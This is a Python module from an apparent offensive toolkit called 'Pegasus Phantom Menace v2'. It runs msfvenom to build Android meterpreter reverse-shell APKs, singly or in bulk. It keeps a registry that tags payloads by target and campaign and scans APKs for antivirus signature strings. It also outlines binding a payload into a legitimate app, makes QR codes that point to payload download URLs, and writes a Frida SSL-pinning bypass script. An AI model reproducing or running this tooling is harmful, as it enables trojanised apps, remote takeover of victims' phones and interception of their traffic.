"""
Pegasus Phantom Menace v2 - Payload Module
Payload generation, binding, DNA tracking, mutation, and encryption.
"""
from __future__ import annotations

import asyncio
import hashlib
import os
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rich.table import Table
from rich.panel import Panel

from pegasus.modules.base import BaseModule
from pegasus.core.plugin import CommandInfo, UIComponent, hook, command, ui_component, HookType
from pegasus.core.config import get_settings


class PayloadModule(BaseModule):
    """Payload generation, binding, DNA tracking, and mutation module."""

    @property
    def module_name(self) -> str:
        return "Payload Generation"

    @property
    def module_description(self) -> str:
        return "msfvenom payload generation, APK binding, DNA tracking, and mutation"

    @property
    def module_category(self) -> str:
        return "payload"

    async def _register_commands(self) -> None:
        self.register_command("payload-gen", "Generate msfvenom payload", self.cmd_payload_gen)
        self.register_command("payload-mass", "Generate multiple payloads", self.cmd_payload_mass)
        self.register_command("payload-dna", "Manage DNA tracking registry", self.cmd_payload_dna)
        self.register_command("payload-mutate", "AI mutation engine", self.cmd_payload_mutate)
        self.register_command("payload-bind", "Bind payload to APK", self.cmd_payload_bind)
        self.register_command("payload-qr", "Generate QR code for payload URL", self.cmd_payload_qr)
        self.register_command("payload-ssl", "Generate SSL pinning bypass Frida script", self.cmd_payload_ssl)

    async def _register_ui_components(self) -> None:
        self.register_ui_component(
            name="payload_dashboard",
            component_type="panel",
            path="/payloads",
            title="Payload Dashboard",
            icon="📦",
            order=2,
        )

    async def _register_hooks(self) -> None:
        self.register_hook(HookType.PAYLOAD_GENERATED, self._on_payload_generated, priority=10)

    # ── Command Handlers ──────────────────────────────────────────────

    async def cmd_payload_gen(self, *args) -> None:
        """Generate a single msfvenom payload."""
        from pegasus.core.config import get_settings
        settings = get_settings()

        payloads = {
            "1": "android/meterpreter/reverse_tcp",
            "2": "android/meterpreter/reverse_https",
            "3": "android/meterpreter/reverse_http",
            "4": "android/shell/reverse_tcp",
            "5": "android/meterpreter/bind_tcp",
        }

        self._console.print("\n[bold]Available Payloads:[/bold]")
        for k, v in payloads.items():
            self._console.print(f"  [{k}] {v}")

        choice = self.prompt("Select payload", choices=list(payloads.keys()), default="1")
        lhost = self.prompt("LHOST", default="127.0.0.1")
        lport = self.prompt_int("LPORT", default=4444)

        output = self.context.get_payloads_dir() / f"payload_{int(time.time())}.apk"

        self._console.print(f"[cyan]► Generating payload: {payloads[choice]}[/cyan]")
        self._console.print(f"[cyan]   LHOST: {lhost}  LPORT: {lport}[/cyan]")

        cmd = [
            "msfvenom",
            "-p", payloads[choice],
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", str(output),
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode == 0:
            self.print_success(f"Payload saved: {output}")
            # Generate DNA tag
            dna = hashlib.sha256(f"{output}{lhost}{lport}{time.time()}".encode()).hexdigest()[:16]
            self._console.print(f"[bold yellow]DNA Tag: {dna}[/bold yellow]")

            await self.hooks.execute(HookType.PAYLOAD_GENERATED, {
                "payload": str(output),
                "type": payloads[choice],
                "lhost": lhost,
                "lport": lport,
                "dna": dna,
            })
        else:
            self.print_error(f"Generation failed: {stderr.decode() if stderr else 'unknown'}")

    async def cmd_payload_mass(self, *args) -> None:
        """Generate multiple payloads with different ports."""
        from pegasus.core.config import get_settings
        settings = get_settings()

        lhost = self.prompt("LHOST", default="127.0.0.1")
        start_port = self.prompt_int("Starting port", default=4444)
        count = self.prompt_int("Number of payloads", default=5)

        self._console.print(f"[cyan]► Generating {count} payloads from port {start_port}...[/cyan]")

        for i in range(count):
            port = start_port + i
            name = f"payload_{i+1:02d}_port{port}"
            output = self.context.get_payloads_dir() / f"{name}.apk"

            cmd = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost}",
                f"LPORT={port}",
                "-o", str(output),
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0:
                self.print_success(f"{name} → {lhost}:{port}")
            else:
                self.print_error(f"{name} failed: {stderr.decode() if stderr else 'unknown'}")

    async def cmd_payload_dna(self, *args) -> None:
        """Manage DNA tracking registry."""
        from pegasus.core.config import get_settings
        dna_dir = self.context.get_dna_dir()
        registry_file = dna_dir / "registry.json"

        import json
        registry = {}
        if registry_file.exists():
            registry = json.loads(registry_file.read_text())

        menu = {
            "1": "Generate DNA tag",
            "2": "Show registry",
            "3": "Back",
        }

        self._console.print("\n[bold]DNA Tracker Menu:[/bold]")
        for k, v in menu.items():
            self._console.print(f"  [{k}] {v}")

        choice = self.prompt("Select", choices=list(menu.keys()), default="3")

        if choice == "1":
            payload_path = self.prompt("Payload path")
            target = self.prompt("Target")
            campaign = self.prompt("Campaign", default="default")

            dna = hashlib.sha256(f"{payload_path}{target}{campaign}{time.time()}".encode()).hexdigest()[:16]
            registry[dna] = {
                "payload": str(payload_path),
                "target": target,
                "campaign": campaign,
                "created": time.strftime("%Y-%m-%d %H:%M"),
            }
            registry_file.write_text(json.dumps(registry, indent=2))
            self.print_success(f"DNA tag: {dna}")

        elif choice == "2":
            if not registry:
                self.print_warning("No DNA tags found")
            else:
                table = Table(title="DNA Registry", header_style="bold cyan")
                table.add_column("DNA Tag", style="bold yellow")
                table.add_column("Payload", style="white")
                table.add_column("Target", style="white")
                table.add_column("Campaign", style="dim")
                for dna, info in registry.items():
                    table.add_row(dna, info.get("payload", ""), info.get("target", ""), info.get("campaign", ""))
                self._console.print(table)

    async def cmd_payload_mutate(self, *args) -> None:
        """AI mutation engine - scan APK and suggest mutations."""
        apk_path = self.prompt("Path to APK file")
        if not apk_path or not os.path.exists(apk_path):
            self.print_error("File not found")
            return

        self._console.print(f"[cyan]► Analyzing {apk_path}...[/cyan]")

        # Check for common AV signatures in strings
        signatures_found = 0
        try:
            with open(apk_path, "rb") as f:
                content = f.read()
                for sig in [b"metasploit", b"Meterpreter", b"payload", b"reverse"]:
                    if sig in content.lower():
                        signatures_found += 1
        except Exception:
            pass

        self.print_info(f"Signatures found: {signatures_found}")
        self.print_info("Mutations applied: 0 (demo mode)")
        self.print_info("Use AI Assistant for deeper analysis (Option 1)")

    async def cmd_payload_bind(self, *args) -> None:
        """Bind payload to existing APK (stub - requires apktool)."""
        self.print_warning("APK binder requires apktool installation")
        apk_path = self.prompt("Target APK path")
        if not apk_path or not os.path.exists(apk_path):
            self.print_error("File not found")
            return
        self._console.print("[dim]APK binding pipeline:[/dim]")
        self._console.print("  1. Decompile host APK with apktool")
        self._console.print("  2. Generate msfvenom payload APK")
        self._console.print("  3. Decompile payload APK")
        self._console.print("  4. Copy payload smali into host")
        self._console.print("  5. Merge permissions")
        self._console.print("  6. Hook launcher Activity onCreate")
        self._console.print("  7. Recompile with apktool")
        self._console.print("  8. Sign with debug keystore")

    async def cmd_payload_qr(self, *args) -> None:
        """Generate QR code for payload URL."""
        try:
            import qrcode
        except ImportError:
            self.print_error("qrcode not installed. Run: pip install qrcode[pil]")
            return

        url = self.prompt("Payload URL (e.g. http://your-ngrok/payload.apk)")
        if not url:
            return

        output = self.context.get_payloads_dir() / f"qr_{int(time.time())}.png"
        img = qrcode.make(url)
        img.save(str(output))
        self.print_success(f"QR code saved: {output}")

    async def cmd_payload_ssl(self, *args) -> None:
        """Generate Frida SSL pinning bypass script."""
        app = self.prompt("Target app package (e.g. com.example.app)")
        if not app:
            return

        script = f"""// Frida SSL Pinning Bypass for {app}
Java.perform(function() {{
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    TrustManagerImpl.checkTrustedRecursive.implementation = function() {{ return []; }};
    console.log("[+] SSL Pinning bypassed for {app}");
}});
"""

        output = self.context.get_payloads_dir() / f"ssl_bypass_{app.replace('.', '_')}.js"
        output.write_text(script)
        self.print_success(f"Frida script saved: {output}")
        self.print_info(f"Deploy with: frida -U -l {output} -f {app}")

    def prompt_int(self, message: str, default: int = 0) -> int:
        """Prompt for an integer."""
        while True:
            val = self.prompt(message, default=str(default))
            try:
                return int(val)
            except ValueError:
                self.print_error("Please enter a valid integer")

    # ── Hook Handlers ─────────────────────────────────────────────────

    async def _on_payload_generated(self, context) -> None:
        """Handle payload generated hook."""
        dna = context.data.get("dna", "unknown")
        self.print_info(f"Payload DNA: {dna}")